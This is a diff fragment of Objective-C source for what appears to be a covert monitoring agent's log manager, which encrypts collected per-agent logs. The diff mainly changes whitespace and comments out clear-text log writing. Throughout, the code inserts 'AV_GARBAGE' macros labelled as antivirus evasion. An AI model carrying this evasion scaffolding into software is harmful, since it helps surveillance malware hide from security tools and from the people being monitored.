@@ -758,12 +758,13 @@ static __m_MLogManager *sharedLogManager = nil;
   AV_GARBAGE_000
   
   id anObject;
-  
+
   while (anObject = [enumerator nextObject])
   {
     if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
         && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
     {
+
       logFound = TRUE;
       
       // AV evasion: only on release build
@@ -773,26 +774,26 @@ static __m_MLogManager *sharedLogManager = nil;
       
       NSData *temp = [NSData dataWithBytes: gLogAesKey
                                     length: CC_MD5_DIGEST_LENGTH];
-      
+
       // AV evasion: only on release build
       AV_GARBAGE_006
       
       int _blockSize = [aData length];
       NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                          length: sizeof(int)];
-      
+
       // AV evasion: only on release build
       AV_GARBAGE_002
-      
+/*
 #ifdef WRITE_CLEAR_TEXT_LOG
       NSFileHandle *clearHandle = [anObject objectForKey: @"clearHandle"];
       [clearHandle writeData: blockSize];
       [clearHandle writeData: aData];
 #endif
-      
+  */
       CCCryptorStatus result = 0;
       result = [aData __encryptWithKey: temp];
-      
+     
       // AV evasion: only on release build
       AV_GARBAGE_004
       
@@ -813,7 +814,7 @@ static __m_MLogManager *sharedLogManager = nil;
       }
     }
   }
-  
+ 
   //
   // If logFound is false and we called this function, it means that the agent
   // is running but no file was created, thus we need to do it here
@@ -831,7 +832,7 @@ static __m_MLogManager *sharedLogManager = nil;
   {
     return FALSE;
   }
-  
+ 
   // AV evasion: only on release build
   AV_GARBAGE_007
   
